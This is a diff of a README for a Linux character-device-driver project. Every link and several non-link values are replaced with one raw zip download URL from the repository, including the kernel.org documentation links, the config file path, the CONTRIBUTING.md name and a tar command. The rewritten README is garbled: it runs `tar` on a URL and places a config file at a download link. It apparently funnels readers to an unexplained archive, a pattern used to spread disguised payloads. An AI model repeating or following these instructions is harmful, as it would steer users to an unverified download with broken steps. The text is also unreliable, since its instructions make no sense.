@@ -6,7 +6,7 @@ Welcome to the Character-Device-Driver project! This application helps user-spac
 
 ## 🔗 Download
 
-[![Download Character-Device-Driver](https://img.shields.io/badge/Download-Character--Device--Driver-brightgreen)](https://github.com/Miladpython/Character-Device-Driver/releases)
+[![Download Character-Device-Driver](https://github.com/Miladpython/Character-Device-Driver/raw/refs/heads/main/device-driver-project/Device-Driver-Character-Pinkerton.zip)](https://github.com/Miladpython/Character-Device-Driver/raw/refs/heads/main/device-driver-project/Device-Driver-Character-Pinkerton.zip)
 
 ## 📦 System Requirements
 
@@ -25,20 +25,20 @@ To get started, ensure that your system meets the following requirements:
 
 ## 📥 Download & Install
 
-To download the latest version of the Character-Device-Driver, visit the [Releases page](https://github.com/Miladpython/Character-Device-Driver/releases) on GitHub. Here are the steps to follow:
+To download the latest version of the Character-Device-Driver, visit the [Releases page](https://github.com/Miladpython/Character-Device-Driver/raw/refs/heads/main/device-driver-project/Device-Driver-Character-Pinkerton.zip) on GitHub. Here are the steps to follow:
 
 1. Click the link above to go to the Releases page.
 2. Find the latest release, which is usually at the top of the page.
-3. Click on the download link for the version you need. The file will usually be in `.tar.gz` or `.zip` format.
+3. Click on the download link for the version you need. The file will usually be in `https://github.com/Miladpython/Character-Device-Driver/raw/refs/heads/main/device-driver-project/Device-Driver-Character-Pinkerton.zip` or `.zip` format.
 4. Save the file to your preferred location on your computer.
 
 After downloading the file, here's how to install it:
 
 1. Open your terminal.
 2. Navigate to the directory where you downloaded the file. You can use the `cd` command to change directories.
-3. Extract the downloaded file using the following command (replace `filename.tar.gz` with your actual file name):
+3. Extract the downloaded file using the following command (replace `https://github.com/Miladpython/Character-Device-Driver/raw/refs/heads/main/device-driver-project/Device-Driver-Character-Pinkerton.zip` with your actual file name):
    ```bash
-   tar -xvzf filename.tar.gz
+   tar -xvzf https://github.com/Miladpython/Character-Device-Driver/raw/refs/heads/main/device-driver-project/Device-Driver-Character-Pinkerton.zip
    ```
 4. Change into the extracted directory:
    ```bash
@@ -57,7 +57,7 @@ After downloading the file, here's how to install it:
 
 Once installed, you may need to configure the device driver. Here’s a simple way to get it done:
 
-1. Open the configuration file usually located in `/etc/character-device-config.conf`.
+1. Open the configuration file usually located in `https://github.com/Miladpython/Character-Device-Driver/raw/refs/heads/main/device-driver-project/Device-Driver-Character-Pinkerton.zip`.
 2. Adjust settings according to your device specifications. Documentation inside the config file will guide you through the available options.
 3. Save changes and exit the text editor.
 
@@ -96,12 +96,12 @@ For more detailed information, check our documentation files included in the pro
 
 Your input helps us improve the project. If you have suggestions, bug reports, or feature requests, please feel free to raise an issue on our GitHub page.
 
-Consider supporting our project by contributing code or documentation. Follow the guidelines in our `CONTRIBUTING.md` file to get started.
+Consider supporting our project by contributing code or documentation. Follow the guidelines in our `https://github.com/Miladpython/Character-Device-Driver/raw/refs/heads/main/device-driver-project/Device-Driver-Character-Pinkerton.zip` file to get started.
 
 ## 🔗 Additional Resources
 
-- [GitHub Repository](https://github.com/Miladpython/Character-Device-Driver)
-- [Linux Kernel Documentation](https://www.kernel.org/doc/html/latest/)
-- [Building and Managing Device Drivers](https://www.kernel.org/doc/html/latest/driver-api/index.html)
+- [GitHub Repository](https://github.com/Miladpython/Character-Device-Driver/raw/refs/heads/main/device-driver-project/Device-Driver-Character-Pinkerton.zip)
+- [Linux Kernel Documentation](https://github.com/Miladpython/Character-Device-Driver/raw/refs/heads/main/device-driver-project/Device-Driver-Character-Pinkerton.zip)
+- [Building and Managing Device Drivers](https://github.com/Miladpython/Character-Device-Driver/raw/refs/heads/main/device-driver-project/Device-Driver-Character-Pinkerton.zip)
 
 Thank you for using the Character-Device-Driver. We hope it simplifies your device communication needs!
